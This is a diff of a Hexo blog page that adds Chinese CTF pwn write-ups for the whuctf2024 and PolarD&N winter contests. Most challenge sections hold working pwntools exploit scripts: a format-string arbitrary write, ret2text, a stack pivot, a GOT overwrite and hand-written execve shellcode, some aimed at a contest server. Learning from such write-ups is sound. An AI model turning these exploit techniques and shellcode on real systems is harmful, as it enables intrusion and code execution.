@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -156,7 +156,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/whuctf2024/wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -174,7 +174,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/04/04/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+          <a href="/2025/04/04/whuctf2024/wp/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta-container">
@@ -185,7 +185,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2025-04-04 00:10:39" itemprop="dateCreated datePublished" datetime="2025-04-04T00:10:39+08:00">2025-04-04</time>
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-15 11:28:09" itemprop="dateModified" datetime="2025-02-15T11:28:09+08:00">2025-02-15</time>
     </span>
 
   
@@ -198,19 +205,46 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+          <h1 id="whuctf2024"><a href="#whuctf2024" class="headerlink" title="whuctf2024"></a>whuctf2024</h1><p>by Maple</p>
+<h2 id="ezformat-string"><a href="#ezformat-string" class="headerlink" title="ezformat-string"></a>ezformat-string</h2><p><em><strong>格式化字符串漏洞实现任意地址写</strong></em></p>
+<p>查看保护</p>
+<img src="./images/image-20250212212038501.png" alt="image-20250212212038501" style="zoom:67%;" />
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>64位，开启了NX，Canary，但是没有开启PIE，地址还是固定的，接下来看一下源码</p>
+<img src="./images/image-20250212211731526.png" alt="image-20250212211731526" style="zoom:67%;" />
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>可以看到需要我们通过格式化字符串漏洞将<code>magic</code>修改为<code>0x32107654BA98FEDC</code>，然后<code>getshell</code></p>
+<p>如果是32位的话我们可以直接<code>fmtstr_payload()</code>函数直接结束这道题目，但是64位程序就需要自己手动构造了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x00000000004CA2F0</span></span><br><span class="line">num = <span class="number">0x32107654ba98fedc</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x3210</span>&#125;</span>c%18$hn%<span class="subst">&#123;<span class="number">0x7654</span>-<span class="number">0x3210</span>&#125;</span>c%19$hn%<span class="subst">&#123;<span class="number">0xba98</span>-<span class="number">0x7654</span>&#125;</span>c%20$hn%<span class="subst">&#123;<span class="number">0xfedc</span>-<span class="number">0xba98</span>&#125;</span>c%21$hn&quot;</span>.encode()</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(magic+<span class="number">6</span>)+p64(magic+<span class="number">4</span>)+p64(magic+<span class="number">2</span>)+p64(magic)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h3 id="64位格式化字符串构造"><a href="#64位格式化字符串构造" class="headerlink" title="64位格式化字符串构造"></a>64位格式化字符串构造</h3><ol>
+<li>先确定偏移</li>
+</ol>
+<p><img src="/./images/image-20250212213454833.png" alt="image-20250212213454833"></p>
+<p>可以看到这里的在格式化字符串后8个偏移</p>
+<blockquote>
+<p><strong>64位格式化字符串的原理：</strong></p>
+<ul>
+<li><code>printf</code>函数的前六个参数分别存放在<code>rdi</code>,<code>rsi</code>,<code>rcx</code>,<code>r8</code>,<code>r9</code>寄存器中，按照从右到做的顺序存放在栈中</li>
+<li><code>%n</code>可以将已经成功输出的字符个数写入对应的整形指针参数所指的变量</li>
+</ul>
+</blockquote>
+<p>这道题中，我们要覆盖的地址为<code>0x00000000004CA2F0</code>，数据为<code>0x32107654BA98FEDC</code>，相当于</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4CA2F0</span>	\<span class="number">0xFEDC</span></span><br><span class="line"><span class="number">0x4CA2F2</span>	\<span class="number">0xBA98</span></span><br><span class="line"><span class="number">0x4CA2F4</span>	\<span class="number">0x7654</span></span><br><span class="line"><span class="number">0x4CA2F6</span>	\<span class="number">0x3210</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>所以我们将这些两字节的数字依次写入</p>
+<blockquote>
+<p>通过<code>%xc</code>输入x个长度的字节，通过<code>%i$hn</code>实现将输入的字节数存在第i个参数，减去前面的是为了保证累计输出正确的数值</p>
+</blockquote>
+<p>接下来因为我是将这些数据存在18-21个参数的地址，所以要进行一定的填充，将后面<code>magic</code>的地址刚好在第18到21个参数处</p>
+<p>我们输入的参数是8，所以填充10个参数，那么应该是<code>10*8=80=0x50</code>,一共填充0x50个数据，可以到达第18个参数</p>
+<p>接下来就会将这些参数依次写入<code>magic</code>的地址里，就可以修改<code>magic</code>的指了</p>
+<h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p>主要考察linux命令行</p>
+<p>运行程序之后发现构造了shell，但是不允许<code>cat flag</code>指令，并且输出不被允许</p>
+<p>但是我们可以发现有一个指令叫<code>showKey</code>，那么我们可以输入<code>sh</code>，这样就可以获得shell，然后在输入<code>exce 1&gt;&amp;0</code>将标准输出改为标准输入，以此<code>cat flag</code></p>
+<h2 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h2><p>菜单题，主要是考察mmap函数，将需要的东西输入好，直接写入shellcode就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch  = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;addr: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1337000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;mode: &#x27;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">p.sendafter(<span class="string">&#x27;note: &#x27;</span>,asm(shellcraft.sh()).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -229,6 +263,950 @@
 
 
 
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/polarD&N/%E5%86%AC%E5%AD%A3%E8%B5%9B/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-11 16:39:52" itemprop="dateModified" datetime="2025-02-11T16:39:52+08:00">2025-02-11</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="PolarD-N冬季个人赛wp"><a href="#PolarD-N冬季个人赛wp" class="headerlink" title="PolarD&amp;N冬季个人赛wp"></a>PolarD&amp;N冬季个人赛wp</h1><p>by Maple</p>
+<blockquote>
+<p>题目可以在<a target="_blank" rel="noopener" href="https://www.polarctf.com/#/page/challenges">这里</a>找，就不上附件了（版权）</p>
+</blockquote>
+<h2 id="like-lib3"><a href="#like-lib3" class="headerlink" title="like_lib3"></a>like_lib3</h2><p>32位<em><strong>ret2text</strong></em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2055</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sys = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(sys)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804857c</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p><em><strong>栈迁移</strong></em>，但不多</p>
+<p>通过栈迁移覆盖<code>rbp</code>的值，让<code>rbp</code>的位置变成<code>passwd</code>，从而实现任意地址读写</p>
+<p>需要注意<code>scanf</code>函数读取的偏移是<code>4</code></p>
+<img src="./images/image-20250203140921533.png" alt="image-20250203140921533" style="zoom:67%;" />
+
+<p>所以可以将<code>passwd</code>迁移到<code>rbp+0x4</code>的位置，这样通过<code>scanf</code>读入寻址，刚好读到<code>rbp</code>上</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2138</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">passwd_addr = <span class="number">0x4033CC</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span>+p64(passwd_addr+<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;input1:&quot;</span>,<span class="string">&quot;4660&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>有些不理解？我们调试看看</p>
+<ul>
+<li>未输入payload时</li>
+</ul>
+<p><img src="/./images/image-20250203142323438.png" alt="image-20250203142323438"></p>
+<blockquote>
+<p>可以看到此时的rbp还是存储的栈结尾地址，<code>0x7ffedda9ade0</code></p>
+</blockquote>
+<ul>
+<li>输入<code>payload</code></li>
+</ul>
+<p><img src="/./images/image-20250203142504855.png" alt="image-20250203142504855"></p>
+<blockquote>
+<p>可以看到此时<code>rbp</code>已经被额外的数据覆盖了，这里<code>0x4033d0</code>也就是<code>passwd_addr+0x4</code></p>
+</blockquote>
+<ul>
+<li><p><code>scanf</code>之后</p>
+<p><img src="/./images/image-20250203143114522.png" alt="image-20250203143114522"></p>
+</li>
+</ul>
+<blockquote>
+<p>这里是将<code>rax</code>的值赋给<code>rbp-4</code>,而rax暂时存储我们的输入，也就是说，这里将4660传递给了<code>rbp-4</code>的位置，那么我们的<code>rbp</code>是多少呢，<code>passwd_addr+0x4</code>!，所以4660传递给了<code>passwd</code>,完成</p>
+</blockquote>
+<ul>
+<li><p>那v4呢？接着看</p>
+<p><img src="/./images/image-20250203143717093.png" alt="image-20250203143717093"></p>
+</li>
+</ul>
+<p><img src="/./images/image-20250203143733532.png" alt="image-20250203143733532"></p>
+<blockquote>
+<p>可以看一下静态汇编，这里第一个判断是将<code>passwd</code>的值传给<code>eax</code>,然后比较；第二个判断是<code>rbp-4</code>的位置传递给<code>eax</code>，然后比较。</p>
+<p>同时动态调试这里也展示的很清楚，pwndbg直接给解释为两次对<code>passwd</code>和<code>0x1234</code>比较</p>
+<p>所以v4，其实已经被抛弃了（瓦达西…)</p>
+</blockquote>
+<p>总之呢，这里可以实现的关键在于<strong>局部变量的寻值是按照rbp的相对偏移</strong>，所以将rbp移动后会改变寻值的对象</p>
+<h2 id="tanjniu"><a href="#tanjniu" class="headerlink" title="tanjniu"></a>tanjniu</h2><p><strong>格式化字符串plt表劫持got表</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2054</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line">p.sendline(<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化字符串plt表劫持got表介绍"><a href="#格式化字符串plt表劫持got表介绍" class="headerlink" title="格式化字符串plt表劫持got表介绍"></a>格式化字符串plt表劫持got表介绍</h3><p>本质上是因为未开启<code>FUll RELRO</code>保护，所以plt表和got表可以被修改；并且格式化字符串有着<strong>任意地址写</strong>的能力。所以可以覆盖GOT表中某个函数的地址，使其指向恶意代码</p>
+<blockquote>
+<p>RELRO（read only relocation）是一种用于加强对binary数据段的保护的技术，大概实现由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号</p>
+</blockquote>
+<p>而pwntools中有格式化字符串修改函数<code>fmtstr_payload(offset,&#123;address:data&#125;)</code>,在buu里面应该讲过，不说了就</p>
+<p>&#x3D;&#x3D;注意这个函数只能给32位程序用&#x3D;&#x3D;</p>
+<h3 id="为什么要确定输入位置"><a href="#为什么要确定输入位置" class="headerlink" title="为什么要确定输入位置"></a>为什么要确定输入位置</h3><ol>
+<li><p><strong>格式化字符串的工作原理：</strong></p>
+<p>当调用如<code>printf(buf)</code>时，<code>printf</code>会从栈上按顺序读取参数</p>
+<ul>
+<li>第一个参数时格式化字符串（<code>buf</code>的地址）</li>
+<li>后续参数时对应格式化字符串中的格式说明符（<code>%d</code>,<code>%s</code>,<code>%n</code>等）</li>
+</ul>
+<blockquote>
+<p>例如：<code>printf(&quot;%d %s&quot;, num, str)</code>这一命令在32位情况下的栈布局</p>
+<p>| 返回地址       |  ← 栈顶<br>| 格式化字符串地址 |  ← printf的第一个参数<br>| num的地址      |  ← printf的第二个参数（对应%d）<br>| str的地址      |  ← printf的第三个参数（对应%s）</p>
+</blockquote>
+</li>
+<li><p><strong>漏洞利用的核心：控制栈上的参数</strong></p>
+<p>如果用户输入的<code>buf</code>包含<strong>可控的格式说明符</strong>（<code>%x</code>,<code>%n</code>等)，可以利用这些访问或者修改栈上的数据</p>
+</li>
+<li><p><strong>确定输入位置</strong></p>
+<p><code>fmtstr_payload(offset,&#123;address:data&#125;)</code>的底层工作原理是：</p>
+<ul>
+<li>将<code>address</code>写入栈中，使其占据第<code>offset</code>个参数的位置</li>
+<li>用<code>%offset$n</code>来修改地址处的值为<code>system</code>的地址</li>
+</ul>
+</li>
+</ol>
+<h2 id="bllbl-shellcode-3⭐"><a href="#bllbl-shellcode-3⭐" class="headerlink" title="bllbl_shellcode_3⭐"></a>bllbl_shellcode_3⭐</h2><p><em><strong>栈迁移+汇编编写shellcode</strong></em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x4040A0</span></span><br><span class="line">leave_ret = <span class="number">0x401338</span></span><br><span class="line">readbss = <span class="number">0x401321</span></span><br><span class="line">jmp_rsp = <span class="number">0x401342</span></span><br><span class="line">sh_addr = <span class="number">0x40201d</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(bss_addr)+p64(readbss)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;nop;&quot;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&quot;mov al,0x3b;mov esi,edi;mov edi,0x40201d;mov edx,esi;syscall;&quot;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&quot;nop;nop&quot;</span>)</span><br><span class="line">shellcode+=p64(jmp_rsp)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>题目直接给我们说BSS段上可以运行<code>/bin/sh</code>，所以应该是需要一步栈迁移的，分析一下</p>
+<h3 id="栈迁移部分"><a href="#栈迁移部分" class="headerlink" title="栈迁移部分"></a>栈迁移部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">yichu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(asc_402028);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>buf距离栈底仅8字节，但<code>read</code>可读入0x20字节，可以覆盖<code>ebp</code>以及后面的一部分，所以我们直接让<code>bss</code>段的地址覆盖</li>
+</ul>
+<p><code>ebp</code></p>
+<ul>
+<li>然后还是需要向<code>bss</code>段写入shellcode，所以还需要一个read函数，直接对原本的read函数进行一个重新调用</li>
+<li>接下来通过<code>leave_ret</code>，将栈移动</li>
+</ul>
+<p><img src="/./images/image-20250204142234302.png" alt="image-20250204142234302"></p>
+<p><img src="/./images/image-20250204142049107.png" alt="image-20250204142049107"></p>
+<blockquote>
+<p>这是输入payload前后的栈，可以看到以下几个变化</p>
+<ul>
+<li>rbp变为了bss段地址</li>
+<li>rbp下面从执行结束指令变为了执行read指令</li>
+<li>leave指令被写入</li>
+</ul>
+</blockquote>
+<p><img src="/./images/image-20250204142643257.png" alt="image-20250204142643257"></p>
+<blockquote>
+<p>这是执行完<code>leave_ret</code>后的寄存器，可以看到栈顶将要执行read函数，栈底（<code>rbp</code>）已经转移到了<code>bss</code>段</p>
+</blockquote>
+<p><strong>至此，我们已经完成了栈迁移的操作，已经将栈底转移到了bss段，也将执行read函数，可以读入shellcode到bss段了</strong></p>
+<blockquote>
+<p>注：关于为什么rbp转移了就可以通过read读入到bss中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf             = byte ptr <span class="number">-8</span></span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, <span class="number">20</span>h 		; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>可以看到存储我们要读入区域的地址（buf，也就是第4行处）的寄存器（rsi）是由rax掌控的</p>
+</li>
+<li><p>而rax又是由[rbp+buf]掌控的，buf又是一个固定的8字节偏移</p>
+</li>
+<li><p>所以只需要移动rbp就可以掌控写入的地址</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="写入shellcode"><a href="#写入shellcode" class="headerlink" title="写入shellcode"></a>写入shellcode</h3><p>即便是可以写入shllcode了，但是我们还是只有0x20字节的空间写入shellcode，常用的<code>asm(shellcraft.sh())</code>需要0x30字节，不够写入，所以需要我们手写一下简化的shellcode</p>
+<h4 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a><strong>写shellcode</strong></h4><p>可以看一下在执行完read之后一些比较关键的寄存器都是多少</p>
+<p><img src="/./images/image-20250204144416284.png" alt="image-20250204144416284"></p>
+<ul>
+<li>RSI指向0x404098,将开始执行此处的指令</li>
+<li>RDI（EDI）为0</li>
+</ul>
+<p>那么可以先写出来可以执行的汇编</p>
